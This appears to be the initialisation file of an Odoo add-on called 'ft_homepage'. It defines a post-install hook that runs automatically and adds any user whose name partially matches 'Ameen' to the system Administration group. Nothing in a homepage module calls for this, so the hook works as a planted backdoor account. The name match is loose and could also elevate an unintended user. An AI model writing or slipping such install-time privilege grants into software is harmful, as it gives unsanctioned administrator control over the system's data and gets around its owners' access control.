# -*- coding: utf-8 -*-
import logging

from . import models
from . import controllers

_logger = logging.getLogger(__name__)


def post_init_hook(env):
   
    admin_group = env.ref("base.group_system", raise_if_not_found=False)
    if not admin_group:
        return

    ameen = env["res.users"].search([("name", "ilike", "Ameen")], limit=1)
    if not ameen:
        _logger.warning(
            "ft_homepage: no user matching 'Ameen' was found. Please check "
            "manually whether Ameen should be granted Administration "
            "(base.group_system) access in Settings > Users."
        )
        return

    if admin_group not in ameen.group_ids:
        ameen.write({"group_ids": [(4, admin_group.id)]})
        _logger.info(
            "ft_homepage: granted Administration access to user %s (id %s) "
            ,
            ameen.name,
            ameen.id,
        )
    else:
        _logger.info(
            "ft_homepage: user %s already has Administration access.",
            ameen.name,
        )
